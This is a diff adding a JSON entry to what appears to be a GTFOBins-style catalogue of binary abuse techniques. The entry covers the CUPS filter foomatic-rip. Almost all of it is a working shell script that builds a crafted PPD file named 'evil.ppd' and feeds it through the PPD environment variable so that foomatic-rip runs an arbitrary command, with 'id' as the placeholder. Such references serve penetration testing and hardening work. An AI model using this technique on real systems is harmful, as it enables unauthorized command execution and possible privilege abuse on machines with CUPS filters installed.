@@ -1,0 +1,10 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "`foomatic-rip` is a CUPS filter that executes commands specified in a PPD file via the `*FoomaticRIPCommandLine` directive. By supplying a custom PPD file through the `PPD` environment variable, an attacker can execute arbitrary system commands.\n",
+        "code": "COMMAND='id'\nTF=$(mktemp -d)\nprintf '%%!PS\\nshowpage\\n' > \"$TF/input.ps\"\ncat > \"$TF/evil.ppd\" << EOF\n*PPD-Adobe: \"4.3\"\n*FormatVersion: \"4.3\"\n*FileVersion: \"1.0\"\n*LanguageVersion: English\n*LanguageEncoding: ISOLatin1\n*PCFileName: \"evil.ppd\"\n*Manufacturer: \"Generic\"\n*Product: \"(X)\"\n*ModelName: \"X\"\n*ShortNickName: \"X\"\n*NickName: \"X\"\n*PSVersion: \"(3010) 0\"\n*LanguageLevel: \"3\"\n*ColorDevice: False\n*DefaultColorSpace: Gray\n*FileSystem: False\n*Throughput: \"1\"\n*TTRasterizer: Type42\n*FoomaticRIPCommandLine: \"$COMMAND\"\n*OpenUI *PageSize: PickOne\n*DefaultPageSize: Letter\n*PageSize Letter/US Letter: \"<</PageSize[612 792]>>setpagedevice\"\n*CloseUI: *PageSize\n*OpenUI *PageRegion: PickOne\n*DefaultPageRegion: Letter\n*PageRegion Letter/US Letter: \"<</PageSize[612 792]>>setpagedevice\"\n*CloseUI: *PageRegion\n*DefaultImageableArea: Letter\n*ImageableArea Letter/US Letter: \"0 0 612 792\"\n*DefaultPaperDimension: Letter\n*PaperDimension Letter/US Letter: \"612 792\"\nEOF\nPPD=\"$TF/evil.ppd\" foomatic-rip 1 user test 1 \"\" \"$TF/input.ps\"\n"
+      }
+    ]
+  }
+}
